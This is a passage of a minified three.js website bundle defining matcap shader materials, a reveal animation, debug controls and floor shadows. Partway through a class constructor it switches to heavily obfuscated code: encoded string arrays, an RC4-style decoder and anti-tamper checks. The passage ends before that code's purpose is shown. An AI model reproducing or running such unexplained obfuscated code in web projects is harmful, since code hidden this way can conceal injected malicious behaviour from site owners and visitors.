i=null!=arguments[t]?arguments[t]:{};t%2?au(Object(i),!0).forEach((function(t){su(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):au(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}({},ii.common,{},ii.bumpmap,{},ii.normalmap,{},ii.displacementmap,{},ii.fog,{matcap:{value:null},uRevealProgress:{value:null},uIndirectDistanceAmplitude:{value:null},uIndirectDistanceStrength:{value:null},uIndirectDistancePower:{value:null},uIndirectAngleStrength:{value:null},uIndirectAngleOffset:{value:null},uIndirectAnglePower:{value:null},uIndirectColor:{value:null}}),extensions:{derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},defines:{MATCAP:""},lights:!1,vertexShader:"#define GLSLIFY 1\n#define TOTO\n#define MATCAP\n#define USE_MATCAP\n\nvarying vec3 vViewPosition;\n\n#ifndef FLAT_SHADED\n\n    varying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\n\n// Custom start\nuniform float uRevealProgress;\n\nvarying vec3 vWorldPosition;\n\n#define M_PI 3.1415926535897932384626433832795\n\nfloat easeSin(float _value)\n{\n    return sin((_value - 0.5) * M_PI) * 0.5 + 0.5;\n}\n\n// Custom end\n\nvoid main() {\n\n    #include <uv_vertex>\n\n    #include <beginnormal_vertex>\n    #include <morphnormal_vertex>\n    #include <skinbase_vertex>\n    #include <skinnormal_vertex>\n    #include <defaultnormal_vertex>\n\n    #ifndef FLAT_SHADED // Normal computed with derivatives when FLAT_SHADED\n\n        vNormal = normalize( transformedNormal );\n\n    #endif\n\n    #include <begin_vertex>\n    #include <morphtarget_vertex>\n    #include <skinning_vertex>\n    #include <displacementmap_vertex>\n\n    // Custom start\n    vec4 worldNormal = modelMatrix * vec4(normal, 1.0);\n\n    vec4 worldPosition = modelMatrix * vec4(transformed, 1.0);\n\n    // Reveal\n    float distanceToCenter = length(worldPosition);\n    float zAmplitude = 3.2;\n    float revealProgress = (uRevealProgress - distanceToCenter / 30.0) * 5.0;\n    revealProgress = 1.0 - clamp(revealProgress, - 0.1, 1.0);\n    revealProgress = pow(revealProgress, 2.0);\n    if(uRevealProgress > 0.9)\n    {\n        revealProgress = 0.0;\n    }\n    worldPosition.z -= revealProgress * zAmplitude;\n\n    // Update varying\n    vWorldPosition = worldPosition.xyz;\n\n    vec4 mvPosition = viewMatrix * worldPosition;\n    gl_Position = projectionMatrix * mvPosition;\n    // Custom end\n\n    // #include <project_vertex>\n\n    #include <logdepthbuf_vertex>\n    #include <clipping_planes_vertex>\n    #include <fog_vertex>\n\n    vViewPosition = - mvPosition.xyz;\n\n}\n",fragmentShader:"#define GLSLIFY 1\n#define TOTO\n#define MATCAP\n#define USE_MATCAP\n\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\n\nvarying vec3 vViewPosition;\n\n// Custom start\nuniform mat3 normalMatrix;\nuniform float uIndirectDistanceAmplitude;\nuniform float uIndirectDistanceStrength;\nuniform float uIndirectDistancePower;\nuniform float uIndirectAngleStrength;\nuniform float uIndirectAngleOffset;\nuniform float uIndirectAnglePower;\nuniform vec3 uIndirectColor;\n\nvarying vec3 vWorldPosition;\n// Custom end\n\n#ifndef FLAT_SHADED\n\n    varying vec3 vNormal;\n\n#endif\n\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\n\nvoid main() {\n\n    if(vWorldPosition.z < 0.0)\n    {\n        discard;\n    }\n\n    #include <clipping_planes_fragment>\n\n    vec4 diffuseColor = vec4( diffuse, opacity );\n\n    #include <logdepthbuf_fragment>\n    #include <map_fragment>\n    #include <alphamap_fragment>\n    #include <alphatest_fragment>\n    #include <normal_fragment_begin>\n    #include <normal_fragment_maps>\n\n    vec3 viewDir = normalize( vViewPosition );\n    vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n    vec3 y = cross( viewDir, x );\n    vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5; // 0.495 to remove artifacts caused by undersized matcap disks\n\n    #ifdef USE_MATCAP\n\n        vec4 matcapColor = texture2D( matcap, uv );\n        matcapColor = matcapTexelToLinear( matcapColor );\n\n    #else\n\n        vec4 matcapColor = vec4( 1.0 );\n\n    #endif\n\n    vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\n    // Custom start\n    float indirectDistanceStrength = clamp(1.0 - vWorldPosition.z / uIndirectDistanceAmplitude, 0.0, 1.0) * uIndirectDistanceStrength;\n    indirectDistanceStrength = pow(indirectDistanceStrength, uIndirectDistancePower);\n    indirectDistanceStrength = clamp(indirectDistanceStrength, 0.0, 1.0);\n\n    vec3 worldNormal = inverseTransformDirection(vNormal, viewMatrix);\n\n    float indirectAngleStrength = dot(normalize(worldNormal), vec3(0.0, 0.0, - 1.0)) + uIndirectAngleOffset;\n    indirectAngleStrength = clamp(indirectAngleStrength * uIndirectAngleStrength, 0.0, 1.0);\n    indirectAngleStrength = pow(indirectAngleStrength, uIndirectAnglePower);\n\n    // vec3 uIndirectColor = vec3(208.0 / 255.0, 69.0 / 255.0, 0.0 / 255.0);\n    float indirectStrength = indirectDistanceStrength * indirectAngleStrength;\n    // float indirectStrength = indirectAngleStrength;\n\n    // gl_FragColor = vec4(vec3(worldNormal), 1.0);\n    // gl_FragColor = vec4(outgoingLight, diffuseColor.a);\n    // gl_FragColor = vec4(vec3(indirectStrength), diffuseColor.a);\n    gl_FragColor = vec4(mix(outgoingLight, uIndirectColor, indirectStrength), diffuseColor.a);\n    // Custom end\n\n    #include <premultiplied_alpha_fragment>\n    #include <tonemapping_fragment>\n    #include <encodings_fragment>\n    #include <fog_fragment>\n\n}\n"})};function lu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var hu=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.resources=t.resources,this.debug=t.debug,this.debug&&(this.debugFolder=this.debug.addFolder("materials"),this.debugFolder.open()),this.items={},this.setPures(),this.setShades(),this.setFloorShadow()}var t,i,n;return t=e,(i=[{key:"setPures",value:function(){this.pures={},this.pures.items={},this.pures.items.red=new qe({color:16711680}),this.pures.items.red.name="pureRed",this.pures.items.white=new qe({color:16777215}),this.pures.items.white.name="pureWhite",this.pures.items.yellow=new qe({color:16771209}),this.pures.items.yellow.name="pureYellow"}},{key:"setShades",value:function(){var e=this;if(this.shades={},this.shades.items={},this.shades.indirectColor="#d04500",this.shades.uniforms={uRevealProgress:0,uIndirectDistanceAmplitude:1.75,uIndirectDistanceStrength:.5,uIndirectDistancePower:2,uIndirectAngleStrength:1.5,uIndirectAngleOffset:.6,uIndirectAnglePower:1,uIndirectColor:null},this.shades.items.white=new cu,this.shades.items.white.name="shadeWhite",this.shades.items.white.uniforms.matcap.value=this.resources.items.matcapWhiteTexture,this.items.white=this.shades.items.white,this.shades.items.orange=new cu,this.shades.items.orange.name="shadeOrange",this.shades.items.orange.uniforms.matcap.value=this.resources.items.matcapOrangeTexture,this.items.orange=this.shades.items.orange,this.shades.items.green=new cu,this.shades.items.green.name="shadeGreen",this.shades.items.green.uniforms.matcap.value=this.resources.items.matcapGreenTexture,this.items.green=this.shades.items.green,this.shades.items.brown=new cu,this.shades.items.brown.name="shadeBrown",this.shades.items.brown.uniforms.matcap.value=this.resources.items.matcapBrownTexture,this.items.brown=this.shades.items.brown,this.shades.items.gray=new cu,this.shades.items.gray.name="shadeGray",this.shades.items.gray.uniforms.matcap.value=this.resources.items.matcapGrayTexture,this.items.gray=this.shades.items.gray,this.shades.items.beige=new cu,this.shades.items.beige.name="shadeBeige",this.shades.items.beige.uniforms.matcap.value=this.resources.items.matcapBeigeTexture,this.items.beige=this.shades.items.beige,this.shades.items.red=new cu,this.shades.items.red.name="shadeRed",this.shades.items.red.uniforms.matcap.value=this.resources.items.matcapRedTexture,this.items.red=this.shades.items.red,this.shades.items.black=new cu,this.shades.items.black.name="shadeBlack",this.shades.items.black.uniforms.matcap.value=this.resources.items.matcapBlackTexture,this.items.black=this.shades.items.black,this.shades.items.emeraldGreen=new cu,this.shades.items.emeraldGreen.name="shadeEmeraldGreen",this.shades.items.emeraldGreen.uniforms.matcap.value=this.resources.items.matcapEmeraldGreenTexture,this.items.emeraldGreen=this.shades.items.emeraldGreen,this.shades.items.purple=new cu,this.shades.items.purple.name="shadePurple",this.shades.items.purple.uniforms.matcap.value=this.resources.items.matcapPurpleTexture,this.items.purple=this.shades.items.purple,this.shades.items.blue=new cu,this.shades.items.blue.name="shadeBlue",this.shades.items.blue.uniforms.matcap.value=this.resources.items.matcapBlueTexture,this.items.blue=this.shades.items.blue,this.shades.items.yellow=new cu,this.shades.items.yellow.name="shadeYellow",this.shades.items.yellow.uniforms.matcap.value=this.resources.items.matcapYellowTexture,this.items.yellow=this.shades.items.yellow,this.shades.items.metal=new cu,this.shades.items.metal.name="shadeMetal",this.shades.items.metal.uniforms.matcap.value=this.resources.items.matcapMetalTexture,this.items.metal=this.shades.items.metal,this.shades.updateMaterials=function(){for(var t in e.shades.uniforms.uIndirectColor=new Ne(e.shades.indirectColor),e.shades.uniforms){var i=e.shades.uniforms[t];for(var n in e.shades.items)e.shades.items[n].uniforms[t].value=i}},this.shades.updateMaterials(),this.debug){var t=this.debugFolder.addFolder("shades");t.open(),t.add(this.shades.uniforms,"uIndirectDistanceAmplitude").step(.001).min(0).max(3).onChange(this.shades.updateMaterials),t.add(this.shades.uniforms,"uIndirectDistanceStrength").step(.001).min(0).max(2).onChange(this.shades.updateMaterials),t.add(this.shades.uniforms,"uIndirectDistancePower").step(.001).min(0).max(5).onChange(this.shades.updateMaterials),t.add(this.shades.uniforms,"uIndirectAngleStrength").step(.001).min(0).max(2).onChange(this.shades.updateMaterials),t.add(this.shades.uniforms,"uIndirectAngleOffset").step(.001).min(-2).max(2).onChange(this.shades.updateMaterials),t.add(this.shades.uniforms,"uIndirectAnglePower").step(.001).min(0).max(5).onChange(this.shades.updateMaterials),t.addColor(this.shades,"indirectColor").onChange(this.shades.updateMaterials)}}},{key:"setFloorShadow",value:function(){var e=this;if(this.items.floorShadow=new ou,this.items.floorShadow.depthWrite=!1,this.items.floorShadow.shadowColor="#d04500",this.items.floorShadow.uniforms.uShadowColor.value=new Ne(this.items.floorShadow.shadowColor),this.items.floorShadow.uniforms.uAlpha.value=0,this.items.floorShadow.updateMaterials=function(){e.items.floorShadow.uniforms.uShadowColor.value=new Ne(e.items.floorShadow.shadowColor);var t=!0,i=!1,n=void 0;try{for(var r,o=e.objects.items[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=!0,c=!1,l=void 0;try{for(var h,u=a.container.children[Symbol.iterator]();!(s=(h=u.next()).done);s=!0){var d=h.value;d.material instanceof Vt&&d.material.uniforms.uShadowColor&&(d.material.uniforms.uShadowColor.value=new Ne(e.items.floorShadow.shadowColor))}}catch(e){c=!0,l=e}finally{try{s||null==u.return||u.return()}finally{if(c)throw l}}}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}},this.debug){var t=this.debugFolder.addFolder("floorShadow");t.open(),t.addColor(this.items.floorShadow,"shadowColor").onChange(this.items.floorShadow.updateMaterials)}}}])&&lu(t.prototype,i),n&&lu(t,n),e}(),uu=function(){return new Vt({wireframe:!1,transparent:!1,uniforms:{tBackground:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n\n    vec3 newPosition = position;\n    newPosition.z = 1.0;\n    gl_Position = vec4(newPosition, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\nuniform sampler2D tBackground;\n\nvarying vec2 vUv;\n\nvoid main()\n{\n    vec4 backgroundColor = texture2D(tBackground, vUv);\n\n    gl_FragColor = backgroundColor;\n}\n"})};var du=function e(t){var haydata_0x30fb61=haydata_0x209b,haydata_0x36d3c6=haydata_0x209b,haydata_0x3240c7=haydata_0x209b,haydata_0x46fd87=haydata_0x209b,haydata_0x507bcb=haydata_0x209b,haydata_0x55898f=haydata_0x2ce3,haydata_0x4cd7d0=haydata_0x2ce3,haydata_0x5f3294=haydata_0x2ce3,haydata_0x24fa70=haydata_0x2ce3,haydata_0x3afde2=haydata_0x2ce3;(function(_0x274fe9,_0x131a37){var _0x14f043=haydata_0x2ce3,_0x585c49=haydata_0x209b,_0x5eb0b3=haydata_0x209b,_0x513129=haydata_0x209b,_0x4b0ec3=haydata_0x209b,_0x416080=haydata_0x209b,_0x52631f=_0x274fe9();while(!![]){try{var _0x2dadb3=-parseInt(_0x585c49(0x1b5))/(-0xd04+-0x309+-0x6*-0x2ad)+parseInt(_0x14f043('0x213','A(OY'))/(0x23bd+-0x1462+-0xf59)+-parseInt(_0x585c49('0x1e4'))/(-0x2*-0x42+0xa*-0x2a0+0x19bf)+parseInt(_0x5eb0b3(0x17a))/(-0x4a*0x6d+-0x64b+-0x25d1*-0x1)+-parseInt(_0x4b0ec3('0x2c4'))/(0x2*-0x1d9+0x133d+0x1*-0xf86)+-parseInt(_0x513129(0x28d))/(-0x1d03+0x2245+0x4*-0x14f)+parseInt(_0x416080('0x2c5'))/(-0x17bc+0x5e7*0x4+0x27);if(_0x2dadb3===_0x131a37)break;else _0x52631f['push'](_0x52631f['shift']())}catch(_0x51c2ee){_0x52631f['push'](_0x52631f['shift']())}}}(haydata_0x5a94,-0xcb2*-0x137+0x127aff+-0x1af*0xc92));function haydata_0x5a94(){var _0x5d3959=['W6Cgkq','jqBdJW','tX/dJa','WOVcLCk6','vmkUWOS','xvBdIa','Dw5P','Bgf5','rhjw','B3v0','quai','WRRcHSkx','faCE','WP3cSCkd','DhjP','BwvZ','zgf0','g8k6xa','W7uxAa','rez2','W4dcJx8','Fmo6WQW','rSkGW70','E8k7W6K','DKzl','BMvL','zMXV','W79/W4a','WPGfW7O','Exz4','z8ohW5e','A2DY','W6HsWQ5JF8oMW5joWPi9W4pdUdu','DMOe','svat','vSoIWRS','ignH','gb4k','WRRcQ8kf','WOXBWQ8','WORdPe8','twf0','W6nJpG','y2ZdIq','z3jY','W6mxCq','WQNcTmkt','W57dH18','W6nFW4a','WRtdSmoS','tSkKWP4','mN7cHq','mtm2odqZogPzwer0sq','yCosW44','BgXL','qK1M','W6NdVSoG','W49Tgq','DxbK','W7KjWRa','AgfU','WRZdU0C','nt/dSW','qMnj','DgvY','BNhdJG','D3Hb','ECozW54','CmoGWRy','pLdcMW','W69eW4G','cCkQWQ4','yM90','gGar','B3jZ','iYmR','W7eCza','bJO2','yCoDbG','DxfP','DCkLla','jWih','uvyI','uxjp','vmkUWPy','W4ShbG','WO3dItO','quru','W4hcJwC','hvLJ','WQ5iWQG','W7qiWOC','Fmo6WQ4','q2fU','W6tdQSoT','WRnvWQ4','B21d','z2vV','wfxdIW','gLP8','v8ovkq','W4pcVSoX','sw9O','zxjP','C2vH','Aw9U','W6ZcS2O','mJy5mJmZnwzYBgncrq','mtC1ntG3nJvLtwP0D2W','x00/','yuPq','ksSK','W60AaW','dmkAWQ8','yxbW','WRNdRSoB','uMLN','WRGfW7O','ot7dNa','W7hcI3q','r8o9ba','W6ShbG','lhJdJW','DuTT','bSkzWRK','W6Ohpa','aCkFWRi','mJmWmtC2ohHyALrPzW','DejH','WQ7cGSkw','W60tmq','C3rY','odGZ','W4ZdQKW','WQ7dR8oa','W64kDG','q29S','zufi','BMvY','WRnzWRm','dmkkWQ4','rujP','BMn0','eCoYW43dNg9iW6pcLCoCp8ojWPfX','WRNdPCoW','mGNdIa','Cxih','Bwv0','rMLS','iaGp','tgvM','CNPP','y0Du','B3vU','W7GmWQm','r0HK','WQNcKCkA','Dg9t','W5rDW6q','bXem','ug1c','kYKR','zwzP','nstdNG','Dw5K','zgvI','ySkVWRG','WPKQW4O','vu1M','WRVcKSk+','ot7dNG','vgT3','mWFdHW','W7nooG','WOFdRCoU','re1J','Bwf0','yMfJ','WQhdVSo9','DNv2','CCogW5q','yxrL','AfPc','ywrK','WRvHca','phdcJG','nJq4ndeXqxLuAg1S','trNdHq','uM4m','aHWD','CML4','FSoyW48','FKxdQG','xX3dGq','sLLB','W7rzW5y','xNFdNq','WQboWR4','WPO5W4a','BxRdNG','ECkAaW','wmoupW','uxfW','Ah/dJG','W5pdICoQ','iLbj','oaNdHq','zgvY','W7mvWPO','BgqF','s1q1','iMxcMW','WR5xWRW','qSkGWPG','C24z','W4FcH2e','tL5lW5zZlCkRWQjJW7nsta','WOZdIuO','y2TN','p0RcMW','AwDM','i1pcOW','DmkPca','WO0mW5G','y21r','EwXi','ANKd','zNj1','uvFdPW','ymk9ca','Dwn0','Dmk1kG','WQtdQLC','mZG4ndG5mKzlwKDSvG','WR/cQ8kB','WRJdVSor','CM91','WOxdRKu','WOy+W5O','W67cG2C','WQnVcq','CYbH','W4RdM8ox','aLrw','CCk6la','WOxcNSkNC8kkW4BcO8o0WR7dMmohW7tdKa','vSoGhq','qKaf','uSkYfW','WRXtWQe','BwfN','ruz4','qvHbW5jZlmkeWRvzW7D7Da','WOTRgW','EgtdJG','nMhcPq','WRjFWRO','W4FdKmkM','WRtdTmo5','W5eaWQ4','W5lcSSo1','kCkBWOK','DwWy','W4aDWPq','WQH8dG','u3nc','W5JdNCoQ','WRfAWOy','W6ZdP38','E8o0WRy','WRDeWQW','W5BcQx4','CSoNaa','d8krWR8','WQj8fa','q8oFkq','A0Ly','y29S','W7jcW5K','W5tdH8oY','WPXDW4/cNveKWRuoW4JcIwRcPq','t3FdQG','smk2W6O','WO5RWQi','WQNcNCkh','Dg9W','EgZdKW','i8kpWPm','vqhdQW','i2y1','CMnO','W7mbWPO','zCk4ga','cX3dNq','Ehr1','C3r1','yvzM','WQ/cNCkc','WRRdTSo6','nJddGW','Emk/la','WPyKW58','D0HP','vSo6WQO','BgWG','w00s','C8o0WRS','q8obkq','E8oqoq','zfrL','WO1FWR0','Dg9T','WRJcT8kI','s09X','DgfP','W7iuWQy','WQ7cTCkG','W5RcUSoR','BMvK','zgzN','W6hdRwC','hH1u','y29U','AMq5','WQJcNSk+','tCk8cG','W4OAWPm','DhP0','fs7dKW','zNff','W7zkW5e','DMfS','rM9S','W4ddNfG','WR8pW7q','W5CaWOG','gLbD','B1vW','WRZdGe4','Agf5','w8oYoa','W6ydWPi','v8kXla','rKKL','W6ejkq','xmoGbW','h8krWR4','fJun','WRtcPCko','B25d'];haydata_0x5a94=function(){return _0x5d3959};return haydata_0x5a94()}function haydata_0x2ce3(_0x17c640,_0x1b80c5){var _0x118cb7=haydata_0x5a94();return haydata_0x2ce3=function(_0x574436,_0x2f8f0e){_0x574436=_0x574436-(0x4*-0x17d+-0x1012+-0x1778*-0x1);var _0x4f22e7=_0x118cb7[_0x574436];if(haydata_0x2ce3['YwbCLC']===undefined){var _0x23b74d=function(_0x39981f){var _0x4d5251='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1ee000='',_0x1cf0a2='',_0x4ff5e1=_0x1ee000+_0x23b74d;for(var _0x35fc44=-0x585*0x4+0x184d+-0x239,_0x38db45,_0x4ea80e,_0x56e186=-0xc5b+0x62*-0x52+0x2bbf;_0x4ea80e=_0x39981f['charAt'](_0x56e186++);~_0x4ea80e&&(_0x38db45=_0x35fc44%(0x15e3+0x2f9*-0x4+-0x9fb)?_0x38db45*(0x141*-0x9+0x61*0x17+0x13*0x26)+_0x4ea80e:_0x4ea80e,_0x35fc44++%(0x78d*0x4+-0x5f*0x33+-0x3c1*0x3))?_0x1ee000+=_0x4ff5e1['charCodeAt'](_0x56e186+(-0xebf+-0x1389+0x1*0x2252))-(-0x52f+0x12ad+-0x35d*0x4)!==0x3da+0x13c+-0xd9*0x6?String['fromCharCode'](0x16*-0x1bf+-0x8bd*-0x1+0x12e*0x1a&_0x38db45>>(-(0xa1a+0x1f52+0x117*-0x26)*_0x35fc44&-0x1216+-0xcb5+0x7*0x467)):_0x35fc44:-0x2375+0x14ac+0xec9){_0x4ea80e=_0x4d5251['indexOf'](_0x4ea80e)}for(var _0x467ebf=0x490+-0x59*0x1f+0x637,_0xd6f87e=_0x1ee000['length'];_0x467ebf<_0xd6f87e;_0x467ebf++){_0x1cf0a2+='%'+('00'+_0x1ee000['charCodeAt'](_0x467ebf)['toString'](-0x3*0xcaa+0x4*0x6e7+0xa72))['slice'](-(-0x679*0x1+-0xb38+-0x17*-0xc5))}return decodeURIComponent(_0x1cf0a2)};var _0x27a98b=function(_0x5e795c,_0x322525){var _0xb6d595=[],_0x2a3a0d=0x41*0x19+0x40b*0x1+0xbe*-0xe,_0x7cff07,_0x4c9f97='';_0x5e795c=_0x23b74d(_0x5e795c);var _0x331abd;for(_0x331abd=0xb59*0x1+0x2216+0x2d6f*-0x1;_0x331abd<0x1e62+-0xfa1+0x1*-0xdc1;_0x331abd++){_0xb6d595[_0x331abd]=_0x331abd}for(_0x331abd=0x16a*0x1b+-0xf*0x5+-0x25e3;_0x331abd<-0x20c1+-0x529*0x1+0x26ea;_0x331abd++){_0x2a3a0d=(_0x2a3a0d+_0xb6d595[_0x331abd]+_0x322525['charCodeAt'](_0x331abd%_0x322525['length']))%(-0xca+0x1a06*-0x1+0x1bd0),_0x7cff07=_0xb6d595[_0x331abd],_0xb6d595[_0x331abd]=_0xb6d595[_0x2a3a0d],_0xb6d595[_0x2a3a0d]=_0x7cff07}_0x331abd=0x1*0x13d6+0x367*0x4+-0x2172,_0x2a3a0d=-0x1c5d*-0x1+0xa*0x2e+-0x44f*0x7;for(var _0x1ea2cb=-0x2645+0x1ce6+-0x95f*-0x1;_0x1ea2cb<_0x5e795c['length'];_0x1ea2cb++){_0x331abd=(_0x331abd+(0x1*0x1e77+-0x1a54+-0x422))%(0xc*-0x13e+0x2121+0x1139*-0x1),_0x2a3a0d=(_0x2a3a0d+_0xb6d595[_0x331abd])%(-0x2083+0x2cf+0x1eb4),_0x7cff07=_0xb6d595[_0x331abd],_0xb6d595[_0x331abd]=_0xb6d595[_0x2a3a0d],_0xb6d595[_0x2a3a0d]=_0x7cff07,_0x4c9f97+=String['fromCharCode'](_0x5e795c['charCodeAt'](_0x1ea2cb)^_0xb6d595[(_0xb6d595[_0x331abd]+_0xb6d595[_0x2a3a0d])%(0x1*-0x1+-0x1f85+0x2086)])}return _0x4c9f97};haydata_0x2ce3['GpOEZe']=_0x27a98b,_0x17c640=arguments,haydata_0x2ce3['YwbCLC']=!![]}var _0x5055f8=_0x118cb7[-0x160a+-0xd*0x176+0x2*0x1484],_0x4f741a=_0x574436+_0x5055f8,_0x2733fe=_0x17c640[_0x4f741a];if(!_0x2733fe){if(haydata_0x2ce3['eeWCaC']===undefined){var _0x130e2f=function(_0x425656){this['Blvfyp']=_0x425656,this['wTbkyz']=[-0x147f+0x2b*0x61+0x435,0x38b*-0xa+-0x1033+0x33a1,-0x1195*-0x1+-0x2519*-0x1+-0x36ae],this['XjbNIL']=function(){return'newState'},this['sZMdkJ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['gvrTVk']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x130e2f['prototype']['LfnTvu']=function(){var _0x5e3a7d=new RegExp(this['sZMdkJ']+this['gvrTVk']),_0x26d257=_0x5e3a7d['test'](this['XjbNIL']['toString']())?--this['wTbkyz'][0xe0*-0xd+-0x1fa2+0x2b03]:--this['wTbkyz'][-0x165a+0x487*0x3+0x5*0x1c1];return this['enOsWe'](_0x26d257)},_0x130e2f['prototype']['enOsWe']=function(_0x52c5ff){if(!Boolean(~_0x52c5ff))return _0x52c5ff;return this['wuvbaY'](this['Blvfyp'])},_0x130e2f['prototype']['wuvbaY']=function(_0x3261a8){for(var _0x17e5ae=0x11ce+-0x472*0x2+0x475*-0x2,_0x33944c=this['wTbkyz']['length'];_0x17e5ae<_0x33944c;_0x17e5ae++){this['wTbkyz']['push'](Math['round'](Math['random']())),_0x33944c=this['wTbkyz']['length']}return _0x3261a8(this['wTbkyz'][-0x5*-0x3d3+-0x1f00+0xbe1])},new _0x130e2f(haydata_0x2ce3)['LfnTvu'](),haydata_0x2ce3['eeWCaC']=!![]}_0x4f22e7=haydata_0x2ce3['GpOEZe'](_0x4f22e7,_0x2f8f0e),_0x17c640[_0x4f741a]=_0x4f22e7}else _0x4f22e7=_0x2733fe;return _0x4f22e7},haydata_0x2ce3(_0x17c640,_0x1b80c5)}function haydata_0x209b(_0xfa3f6,_0x52f556){var _0x29fc20=haydata_0x5a94();return haydata_0x209b=function(_0x2b653f,_0x3146e8){_0x2b653f=_0x2b653f-(0x4*-0x17d+-0x1012+-0x1778*-0x1);var _0x111a0a=_0x29fc20[_0x2b653f];if(haydata_0x209b['TsWuFC']===undefined){var _0x54dece=function(_0x60a7ad){var _0x1f8861='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1d7ee2='',_0x581ee7='',_0x43d413=_0x1d7ee2+_0x54dece;for(var _0x3e8678=-0x585*0x4+0x184d+-0x239,_0x1e0a5d,_0x480ba9,_0x48d8db=-0xc5b+0x62*-0x52+0x2bbf;_0x480ba9=_0x60a7ad['charAt'](_0x48d8db++);~_0x480ba9&&(_0x1e0a5d=_0x3e8678%(0x15e3+0x2f9*-0x4+-0x9fb)?_0x1e0a5d*(0x141*-0x9+0x61*0x17+0x13*0x26)+_0x480ba9:_0x480ba9,_0x3e8678++%(0x78d*0x4+-0x5f*0x33+-0x3c1*0x3))?_0x1d7ee2+=_0x43d413['charCodeAt'](_0x48d8db+(-0xebf+-0x1389+0x1*0x2252))-(-0x52f+0x12ad+-0x35d*0x4)!==0x3da+0x13c+-0xd9*0x6?String['fromCharCode'](0x16*-0x1bf+-0x8bd*-0x1+0x12e*0x1a&_0x1e0a5d>>(-(0xa1a+0x1f52+0x117*-0x26)*_0x3e8678&-0x1216+-0xcb5+0x7*0x467)):_0x3e8678:-0x2375+0x14ac+0xec9){_0x480ba9=_0x1f8861['indexOf'](_0x480ba9)}for(var _0x801f24=0x490+-0x59*0x1f+0x637,_0x331d4e=_0x1d7ee2['length'];_0x801f24<_0x331d4e;_0x801f24++){_0x581ee7+='%'+('00'+_0x1d7ee2['charCodeAt'](_0x801f24)['toString'](-0x3*0xcaa+0x4*0x6e7+0xa72))['slice'](-(-0x679*0x1+-0xb38+-0x17*-0xc5))}return decodeURIComponent(_0x581ee7)};haydata_0x209b['Sqgzfm']=_0x54dece,_0xfa3f6=arguments,haydata_0x209b['TsWuFC']=!![]}var _0xf8d8db=_0x29fc20[0x41*0x19+0x40b*0x1+0xbe*-0xe],_0x3c0921=_0x2b653f+_0xf8d8db,_0x311134=_0xfa3f6[_0x3c0921];if(!_0x311134){var _0x23913b=function(_0x2dc4aa){this['CSMSAh']=_0x2dc4aa,this['EgDYvO']=[0xb59*0x1+0x2216+0x16b7*-0x2,0x1e62+-0xfa1+0x1*-0xec1,0x16a*0x1b+-0xf*0x5+-0x25e3],this['cMANAg']=function(){return'newState'},this['udPKoh']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['XMQxWB']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x23913b['prototype']['CPALTv']=function(){var _0x73f3ed=new RegExp(this['udPKoh']+this['XMQxWB']),_0x2faf39=_0x73f3ed['test'](this['cMANAg']['toString']())?--this['EgDYvO'][-0x20c1+-0x529*0x1+0x25eb]:--this['EgDYvO'][-0xca+0x1a06*-0x1+0x1ad0];return this['hRVUoZ'](_0x2faf39)},_0x23913b['prototype']['hRVUoZ']=function(_0x937581){if(!Boolean(~_0x937581))return _0x937581;return this['vtLSYU'](this['CSMSAh'])},_0x23913b['prototype']['vtLSYU']=function(_0x4726f4){for(var _0x4efca4=0x1*0x13d6+0x367*0x4+-0x2172,_0x237804=this['EgDYvO']['length'];_0x4efca4<_0x237804;_0x4efca4++){this['EgDYvO']['push'](Math['round'](Math['random']())),_0x237804=this['EgDYvO']['length']}return _0x4726f4(this['EgDYvO'][-0x1c5d*-0x1+0xa*0x2e+-0x44f*0x7])},new _0x23913b(haydata_0x209b)['CPALTv'](),_0x111a0a=haydata_0x209b['Sqgzfm'](_0x111a0a),_0xfa3f6[_0x3c0921]=_0x111a0a}else _0x111a0a=_0x311134;return _0x111a0a},haydata_0x209b(_0xfa3f6,_0x52f556)}var i=this;if(function(_0x450010,_0x2f115c){var _0x3926d9=haydata_0x2ce3,_0xb7e2ea=haydata_0x2ce3,_0x31f19b=haydata_0x2ce3,_0x427e7a=haydata_0x2ce3,_0x29277a=haydata_0x2ce3,_0x42bd90=haydata_0x209b,_0x58373e=haydata_0x209b,_0x440f4f=haydata_0x209b,_0xb0aaac=haydata_0x209b,_0x8eaa5a=haydata_0x209b,_0x5486fb={'DFvNV':function(_0x138752,_0x26c2be){return _0x138752*_0x26c2be},'wHifF':function(_0x3ebdae,_0x521f6a){return _0x3ebdae*_0x521f6a},'TORrA':function(_0x2d4d94,_0x2bed66){return 